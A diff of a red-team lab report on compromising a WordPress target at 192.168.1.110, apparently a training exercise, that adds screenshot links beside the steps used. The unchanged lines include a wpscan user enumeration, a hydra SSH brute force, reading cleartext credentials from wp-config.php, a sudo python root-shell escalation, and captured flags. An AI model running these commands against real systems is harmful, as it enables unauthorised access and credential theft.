@@ -238,15 +238,20 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - WordPress allows an attacker to enumerate valid usernames in a brute force attack.
       - Command run: `wpscan --url 192.168.1.110/wordpress --enumerate u`
 ![](Resources/wpscan1.png)
+![](Resources/wpscan2.png)
   - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Brute forceable SSH password**
       - The password for user michael is weak and easily brute forced
       - `hydra -l michael -P /usr/share/wordlists/rockyou.txt -s 22 -f 192.168.1.110 ssh`
+![](Resources/hydra.png)
   - `flag3.txt`: flag3{afc01ab56b5091e7dccf93122770cd2}
     - **Insecure Password Storage**
       - The password to the Wordpress server's SQL database is stored in cleartext in wp-config.php
       - Command run: `nano /var/www/html/wordpress/wp-config.php`
+![](Resources/wp-config-unsecured.png)
+![](Resources/wp-config-unsecured.png)
   - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
     - **Improper sudoers file configuration**
       - The sudoers file allowed user steven to perform a privelege escalation by letting him run `python` as root
       - Command run: `sudo python -c 'import pty; pty.spawn("/bin/bash")'`
+![](Resources/privelege-escalation.png)
